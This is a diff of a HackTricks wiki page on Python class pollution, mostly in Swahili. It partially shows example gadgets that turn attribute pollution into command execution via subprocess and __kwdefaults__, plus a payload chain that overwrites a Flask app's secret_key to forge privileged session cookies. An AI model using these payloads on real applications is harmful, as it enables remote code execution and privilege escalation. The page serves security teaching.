@@ -1,23 +1,23 @@
-# Uchafuzi wa Darasa (Uchafuzi wa Kielelezo cha Python)
+# Class Pollution (Python's Prototype Pollution)
 
 {% hint style="success" %}
-Jifunze na zoezi la Udukuzi wa AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Timu Nyekundu Mtaalam (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na zoezi la Udukuzi wa GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Timu Nyekundu Mtaalam (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 ## Mfano wa Msingi
 
-Angalia jinsi inavyowezekana kuchafua darasa la vitu na herufi:
+Angalia jinsi inavyowezekana kuchafua madarasa ya vitu kwa kutumia nyuzi:
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -41,7 +41,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Mfano wa Udhaifu wa Msingi
+## Mfano wa Uthibitisho wa Msingi
 ```python
 # Initial state
 class Employee: pass
@@ -74,11 +74,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Mifano ya Gadgeti
+## Mfano wa Gadget
 
 <details>
 
-<summary>Kuunda thamani ya msingi ya mali ya darasa kwa RCE (subprocess)</summary>
+<summary>Kuumba thamani ya chaguo la mali ya darasa kuwa RCE (subprocess)</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -129,7 +129,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Kuchafua darasa zingine na vars za ulimwengu kupitia <code>globals</code></summary>
+<summary>Kuchafua madarasa mengine na vars za kimataifa kupitia <code>globals</code></summary>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -161,7 +161,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Kutekeleza mchakato wa chini kwa hiari</summary>
+<summary>Utendaji wa subprocess usio na mipaka</summary>
 ```python
 import subprocess, json
 
@@ -193,9 +193,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>Kuandika upya <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Kupitia <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** ni sifa maalum ya kazi zote, kulingana na [hati ya Python](https://docs.python.org/3/library/inspect.html), ni "ramani ya thamani za chaguo-msingi kwa vigezo vya **maneno-pekee**". Kuchafua sifa hii inaruhusu sisi kudhibiti thamani za chaguo-msingi za vigezo vya maneno-pekee vya kazi, hivi ni vigezo vya kazi vinavyokuja baada ya \* au \*args.
+**`__kwdefaults__`** ni sifa maalum ya kazi zote, kulingana na [nyaraka za Python](https://docs.python.org/3/library/inspect.html), ni “ramani ya thamani zozote za msingi kwa **parameta za neno muhimu pekee**”. Kuingiza uchafu katika sifa hii inatupa uwezo wa kudhibiti thamani za msingi za parameta za neno muhimu pekee za kazi, hizi ni parameta za kazi zinazokuja baada ya \* au \*args.
 ```python
 from os import system
 import json
@@ -236,17 +236,17 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Kuandika upya siri ya Flask kote kwenye faili</summary>
+<summary>Kufuta siri ya Flask kati ya faili</summary>
 
-Kwa hivyo, ikiwa unaweza kufanya uchafuzi wa darasa juu ya kitu kilichoelezwa kwenye faili kuu ya python ya wavuti lakini **ambayo darasa lake limefafanuliwa kwenye faili tofauti** kuliko ile kuu. Kwa sababu ili kupata \_\_globals\_\_ katika mizigo iliyopita unahitaji kupata darasa la kitu au njia za darasa, utaweza **kupata globals katika faili hiyo, lakini sio kwenye ile kuu**. \
-Kwa hivyo, **hutaweza kupata kitu cha kawaida cha programu ya Flask** kilichoelezea **ufunguo wa siri** kwenye ukurasa wa msingi:
+Hivyo, ikiwa unaweza kufanya uchafuzi wa darasa juu ya kitu kilichofafanuliwa katika faili kuu ya python ya wavuti lakini **ambayo darasa lake limefafanuliwa katika faili tofauti** na ile kuu. Kwa sababu ili kufikia \_\_globals\_\_ katika payloads zilizopita unahitaji kufikia darasa la kitu au mbinu za darasa, utaweza **kufikia globals katika faili hiyo, lakini si katika ile kuu**. \
+Kwa hivyo, **hutaweza kufikia kitu cha kimataifa cha programu ya Flask** ambacho kilifafanua **funguo ya siri** katika ukurasa kuu:
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Katika hali hii unahitaji kifaa cha kupitia faili ili kufikia faili kuu **kupata kipengele cha kimataifa `app.secret_key`** ili kubadilisha ufunguo wa siri wa Flask na kuweza [**kupandisha vyeo** ukiwa na ufahamu wa ufunguo huu](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Katika hali hii unahitaji kifaa ili kupita faili kupata faili kuu ili **kupata kituo cha kimataifa `app.secret_key`** kubadilisha funguo ya siri ya Flask na uweze [**kuinua mamlaka** ukijua funguo hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Payload kama hii [kutoka kwenye andiko hili](https://ctftime.org/writeup/36082):
+Malipo kama haya [kutoka kwa andiko hili](https://ctftime.org/writeup/36082):
 
 {% code overflow="wrap" %}
 ```python
@@ -254,31 +254,31 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 ```
 {% endcode %}
 
-Tumia mzigo huu wa **kubadilisha `app.secret_key`** (jina katika programu yako linaweza kutofautiana) ili uweze kusaini vidakuzi vya flask vipya na vyenye mamlaka zaidi.
+Tumia payload hii kubadilisha **`app.secret_key`** (jina katika programu yako linaweza kuwa tofauti) ili uweze kusaini vidakuzi vya flask vipya na vya kibali zaidi.
 
 </details>
 
-Angalia pia ukurasa ufuatao kwa vifaa vya kusoma tu zaidi:
+Angalia pia ukurasa ufuatao kwa vifaa vya kusoma pekee:
 
 {% content-ref url="python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-## Marejeo
+## Marejeleo
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
 {% hint style="success" %}
-Jifunze & jifunze AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Mafunzo ya HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze & jifunze GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Mafunzo ya HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa michango**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki hila za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
 {% endhint %}
